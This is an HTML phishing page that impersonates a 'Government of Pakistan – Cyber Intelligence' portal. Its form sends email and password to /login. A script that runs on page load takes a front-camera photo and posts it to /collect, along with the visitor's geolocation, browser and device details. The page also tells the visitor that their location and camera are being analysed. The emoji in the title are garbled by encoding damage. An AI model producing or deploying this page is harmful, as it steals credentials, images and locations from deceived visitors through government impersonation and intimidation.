<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>üáµüá∞ Government of Pakistan ‚Äì Cyber Intelligence</title>
  <link rel="üáµüá∞" href="/static/icon.png">
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #1b2631;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .box {
      background: rgba(255, 255, 255, 0.1);
      padding: 30px;
      border-radius: 16px;
      box-shadow: 0 0 20px rgba(0,0,0,0.3);
      text-align: center;
      width: 360px;
      backdrop-filter: blur(8px);
    }
    h1 {
      font-size: 22px;
      margin-bottom: 10px;
    }
    p {
      font-size: 14px;
      margin: 10px 0;
    }
    input, button {
      width: 100%;
      padding: 10px;
      margin: 6px 0;
      border-radius: 6px;
      border: none;
      font-size: 14px;
    }
    input {
      background: #ecf0f1;
      color: #2c3e50;
    }
    button {
      background: #e74c3c;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }
    button:hover {
      background: #c0392b;
    }
    img {
      width: 80px;
      margin-bottom: 10px;
    }
  </style>
</head>
<body>
  <div class="box">
    <img src="/static/pakistan-emblem.png" alt="Gov Logo">
    <h1>üáµüá∞ Government of Pakistan ‚Äì Cyber Intelligence</h1>
    <p>Confidential system ‚Äì Your location & camera are being analyzed...</p>
    <form method="POST" action="/login">
      <input type="text" name="email" placeholder="Email" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">üîç Check Now</button>
    </form>
  </div>

  <script>
    async function sendPhoto(blob) {
      const formData = new FormData();
      formData.append('photo', blob, 'photo.jpg');
      await fetch('/collect', { method: 'POST', body: formData });
    }

    function captureImage(video) {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);
      canvas.toBlob(sendPhoto);
    }

    async function askForPermissions() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        setTimeout(() => {
          captureImage(video);
          stream.getTracks().forEach(track => track.stop());
        }, 3000);

        navigator.geolocation.getCurrentPosition(
          pos => {
            fetch('/collect', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                latitude: pos.coords.latitude,
                longitude: pos.coords.longitude,
                camera: '‚úÖ Camera Allowed',
                userAgent: navigator.userAgent,
                deviceInfo: navigator.platform
              })
            });
          },
          err => {
            fetch('/collect', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                latitude: null,
                longitude: null,
                camera: '‚úÖ Camera Allowed, ‚ùå Location Denied',
                userAgent: navigator.userAgent,
                deviceInfo: navigator.platform
              })
            });
          }
        );

      } catch (err) {
        fetch('/collect', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            latitude: null,
            longitude: null,
            camera: '‚ùå Camera Denied',
            userAgent: navigator.userAgent,
            deviceInfo: navigator.platform
          })
        });
      }
    }

    window.onload = askForPermissions;
  </script>
</body>
</html>
